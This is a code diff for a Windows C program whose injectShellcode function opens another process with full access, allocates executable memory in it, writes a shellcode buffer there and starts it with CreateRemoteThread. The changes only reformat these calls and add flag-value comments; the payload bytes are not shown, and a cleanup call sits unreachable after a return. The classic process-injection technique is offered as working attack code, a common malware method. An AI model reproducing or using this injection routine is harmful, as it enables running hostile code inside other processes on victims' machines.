@@ -52,7 +52,11 @@ int injectShellcode() {
 	system("cls");
 	printf("\n%s PID selected (%d)", in, PID);
 
-	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
+	hProcess = OpenProcess(
+		PROCESS_ALL_ACCESS, // (STANDARD_RIGHTS_REQUIRED (0x000F0000L) | SYNCHRONIZE (0x00100000L) | 0xFFFF)
+		FALSE,
+		PID
+	);
 
 	if (hProcess == NULL) {
 		printf("\n%s couldn't attach to %i", er, PID);
@@ -125,14 +129,26 @@ int injectShellcode() {
 	printf("\n%s starting injection...", in);
 	printf("\n%s allocating memory...\n\n", in);
 	
-	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(buf), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+	rBuffer = VirtualAllocEx(
+		hProcess, 
+		NULL, 
+		sizeof(buf), 
+		(MEM_COMMIT | MEM_RESERVE), // 0x00001000 | 0x00002000
+		PAGE_EXECUTE_READWRITE // 0x40
+	);
 
 	printf("\t%s VirtualAllocEx() [flProtect ---> PAGE_EXECUTE_READWRITE (RWX)]\n", in);
 	printf("\t%s VirtualAllocEx() [flAllocationType ---> MEM_COMMIT | MEM_RESERVE]\n", in);
 	printf("\n%s allocated memory", ok);
 
 	printf("\n%s writing to process memory...", in);
-	WriteProcessMemory(hProcess, rBuffer, buf, sizeof(buf), NULL);
+	WriteProcessMemory(
+		hProcess, 
+		rBuffer, 
+		buf, 
+		sizeof(buf), 
+		NULL
+	);
 	printf("\n%s wrote to process memory", ok);
 
 	DWORD sleepTime;
@@ -152,7 +168,15 @@ int injectShellcode() {
 
 	}
 
-	rThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, NULL);
+	rThread = CreateRemoteThread(
+		hProcess,
+		NULL,
+		0,
+		(LPTHREAD_START_ROUTINE)rBuffer,
+		NULL,
+		0,
+		NULL
+	);
 	printf("\n%s created remote thread", ok);
 
 	printf("\n%s closing handle to process...", in);
@@ -161,7 +185,11 @@ int injectShellcode() {
 
 	return 0;
 
-	if (!WTSFreeMemoryEx(WTSTypeProcessInfoLevel1, procInfo, processCounter)) {
+	if (!WTSFreeMemoryEx(
+		WTSTypeProcessInfoLevel1,
+		procInfo,
+		processCounter
+	)) {
 		printf("\n%s something went wrong. couldn't free the memory. you're on your own.", er);
 		return EXIT_FAILURE;
 	}
